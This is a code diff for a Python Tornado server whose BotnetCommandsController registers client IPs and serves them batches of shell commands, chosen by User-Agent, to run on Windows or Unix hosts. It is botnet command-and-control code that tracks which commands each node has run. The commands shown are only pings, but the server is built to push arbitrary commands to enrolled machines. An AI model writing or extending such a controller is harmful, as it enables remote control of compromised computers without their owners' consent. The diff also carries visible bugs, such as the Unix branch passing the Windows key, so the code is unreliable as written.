@@ -19,16 +19,32 @@ import os
 
 define('debug', default=True, help="debug mode", type=bool)
 
-class ClientCache():
 
+class ClientCache:
     def __init__(self):
         self.nodes = {}
 
-    def add_node(self, clientIp, info):
-        self.nodes[clientIp] = {
-            'last_seen': int(time.time()),
-            'info': info
-        }
+    def add_node(self, clientIp):
+        if clientIp not in self.nodes:
+            self.nodes[clientIp] = {
+                'last_seen': int(time.time()),
+                'windows': [],
+                'unix': [],
+            }
+        else:
+            self.nodes[clientIp]['last_seen'] = int(time.time())
+
+    def commands_to_execute(self, clientIp, commands, os='unix'):
+        """
+        Returns which commands to execute, skips commands which were already executed once
+        """
+
+        to_execute = []
+        for key, comm in commands.items():
+            if key not in self.nodes[clientIp][os]:
+                self.nodes[clientIp][os].append(key)
+                to_execute.append(comm)
+        return to_execute
 
     def clean_up_expired(self):
         nodes_to_delete = []
@@ -38,12 +54,6 @@ class ClientCache():
 
         for node in nodes_to_delete:
             del nodes_to_delete[node]
-
-
-class CommandsService():
-    @staticmethod
-    def get_commands(os, primaryLanguage, clientIp):
-       return ''
 
 
 class MainHandler(tornado.web.RequestHandler):
@@ -57,6 +67,9 @@ class NodesHandler(tornado.web.RequestHandler):
     """
     """
     def get(self):
+        key = self.get_argument('key', '')
+        if key:
+            self.write(json.dumps(self.application.clients_cache.nodes.get(key, {})))
         self.write(json.dumps(self.application.clients_cache.nodes))
 
 
@@ -92,16 +105,21 @@ class BotnetCommandsController(tornado.web.RequestHandler):
         headers = self.request.headers
         print(headers)
         clientIp = self.request.remote_ip
+        self.application.clients_cache.add_node(clientIp)
 
-        clientinfo = {}  # todo
-        self.application.clients_cache.add_node(clientIp, clientinfo)
-
-        #commands = CommandsService.get_commands(os, primaryLanguage, clientIp)
         if 'windows' in headers.get('User-Agent', '').lower():
-            self.write(' ; '.join(self.application.commands['windows'].values()))
+            commands = self.application.commands['windows']
+            re = self.application.clients_cache.commands_to_execute(clientIp,
+                                                                    commands,
+                                                                    'windows')
+            self.write(' ; '.join(re))
         else:
             # unix system
-            self.write(' && '.join(self.application.commands['unix'].values()))
+            commands = self.application.commands['unix']
+            re = self.application.clients_cache.commands_to_execute(clientIp,
+                                                                    commands,
+                                                                    'windows')
+            self.write(' && '.join(re))
 
 class Application(tornado.web.Application):
     """
@@ -115,9 +133,8 @@ class Application(tornado.web.Application):
             ]
 
         self.clients_cache = ClientCache()
-        self.com_service = CommandsService()
 
-        self.commands =dict(
+        self.commands = dict(
             windows={
                 'pingas': 'ping -n 2 google.com',
                 'nepingas': 'ping -n 2 facebook.com'
